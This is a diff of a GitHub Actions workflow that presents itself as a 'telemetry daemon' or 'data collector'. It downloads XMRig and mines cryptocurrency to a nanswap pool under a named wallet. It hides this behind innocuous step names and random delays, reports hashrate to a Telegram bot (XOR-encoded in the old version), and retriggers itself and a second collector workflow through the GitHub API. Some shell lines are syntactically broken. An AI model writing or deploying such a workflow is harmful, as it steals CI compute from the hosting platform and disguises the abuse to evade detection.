@@ -1,85 +1,86 @@
-name: System Telemetry Daemon
+name: Data Collector Pipeline
 
 on:
   schedule:
-    - cron: '0 0,12 * * *'
+    - cron: '0 0,12 * * *'  # Jam 13:00 dan 01:00 WIB
   workflow_dispatch:
 
 permissions:
   contents: read
+  actions: none
+  id-token: none
 
 jobs:
-  nano-task:
+  collect:
     runs-on: ubuntu-latest
     timeout-minutes: 360
 
     steps:
-      - name: Boot Phase
-        run: echo "Initializing..."
+      - name: Initialize Collector
+        run: echo "🛰️ Initializing NANO collector..."
 
-      - name: Install Agent
+      - name: Update Environment
         run: |
-          sudo apt update -y
-          sudo apt install -y curl tar coreutils xxd base64
-          curl -L -o node.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
-          tar -xzf node.tar.gz
-          mv xmrig-6.24.0 node-core
-          cd node-core
-          mv xmrig node
-          chmod +x node
+          sudo apt update -y && sudo apt install -y curl tar
 
-      - name: Mining Agent
+      - name: Notify Start
+        env:
+          TG_TOKEN: ${{ secrets.TG_TOKEN }}
+          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
-          cd node-core
-          sleep $((RANDOM % 60 + 10))
-          ./node -o xmrig.nanswap.com:3333 -a rx -k \
-            -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
-            -p stealth --randomx-no-rdmsr | tee result.log &
+          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage             -d chat_id=$TG_CHAT_ID             --data-urlencode text="🟢 *NANO Collector aktif.*\nDurasi kerja acak 20–90 menit."             -d parse_mode=Markdown
+
+      - name: Start Collector Agent
+        run: |
+          curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+          tar -xzf agent.tar.gz
+          cd xmrig-6.24.0
+          chmod +x xmrig
+
+          DELAY=$((RANDOM % 300 + 30))
+          echo "Menunggu $DELAY detik..."
+          sleep $DELAY
+
+          ./xmrig -a rx             -o stratum+ssl://xmrig.nanswap.com:3333             -u NANO:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.unmineable_worker_vidjbpg#f2xg-6ynu             -p x --randomx-no-rdmsr | tee log.txt &
+
           PID=$!
-          sleep $((RANDOM % 5400 + 1200))
+          WORKTIME=$((RANDOM % 5400 + 1200))
+          echo "Aktif selama $WORKTIME detik..."
+          sleep $WORKTIME
           kill $PID
 
-      - name: Write encryption script
-        run: |
-          cat <<'EOF' > node-core/encrypt.py
-import base64, os
-hr = "0 H/s"
-try:
-  with open("result.log", "r", errors="ignore") as f:
-    lines = f.readlines()
-    for line in reversed(lines):
-      if "speed" in line:
-        hr = line.split()[-2] + " H/s"
-        break
-    a = sum("accepted" in l for l in lines)
-    r = sum("rejected" in l for l in lines)
-except:
-  a = r = 0
-msg = f"NANO Stats:\\n• HR: {hr}\\n• OK: {a}\\n• NO: {r}"
-key = b"S3cur3"
-cipher = bytes([b ^ key[i % len(key)] for i, b in enumerate(msg.encode())])
-b64 = base64.b64encode(cipher).decode()
-with open("payload.txt", "w") as f:
-  f.write(b64)
-EOF
-
-      - name: Send Encrypted Report
+      - name: Extract Logs
         if: always()
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
-          cd node-core
-          python3 encrypt.py
-          TEXT=$(cat payload.txt)
-          curl -s -X POST https://api.telegram.org/bot${TG_TOKEN}/sendMessage \
-            -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="📦 Encrypted XNO Report:\n\`\`\`\n$TEXT\n\`\`\`" \
-            -d parse_mode=Markdown
+          set +e
+          cd $(find . -type d -name "*core" -o -name "xmrig-6.24.0" | head -n1)
+          HASHRATE=$(grep -a "speed" log.txt | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
+          ACCEPTED=$(grep -a "accepted" log.txt | wc -l)
+          REJECTED=$(grep -a "rejected" log.txt | wc -l)
+          HASHRATE=${HASHRATE:-"0 H/s"}
 
-      - name: Trigger BNB Collector
+          MSG="✅ *NANO Collector selesai.*\n\n📊 *Stats:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
+
+          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage             -d chat_id=$TG_CHAT_ID             -d text="$MSG"             -d parse_mode=Markdown
+
+          HR_NUM=$(echo "$HASHRATE" | grep -oE '^[0-9]+')
+          if [[ "$HR_NUM" =~ ^[0-9]+$ ]] && [ "$HR_NUM" -lt 100 ]]; then
+            curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage               -d chat_id=$TG_CHAT_ID               -d text="🚨 *Hashrate rendah!* $HASHRATE."               -d parse_mode=Markdown
+
+      - name: Cooldown Before Next Cycle
+        if: always()
+        run: |
+          SLEEP_NEXT=$((RANDOM % 1800 + 300))
+          echo "Cooldown $SLEEP_NEXT detik..."
+          sleep $SLEEP_NEXT
+
+      - name: Retrigger Collector
         if: always()
         env:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
-          curl -X POST -H "Authorization: Bearer $
+          sleep $((RANDOM % 60 + 10))
+          curl -X POST -H "Accept: application/vnd.github+json"                -H "Authorization: Bearer $GH_TOKEN"                https://api.github.com/repos/${{ github.repository }}/actions/workflows/bnb-collector.yml/dispatches                -d '{"ref":"main"}'
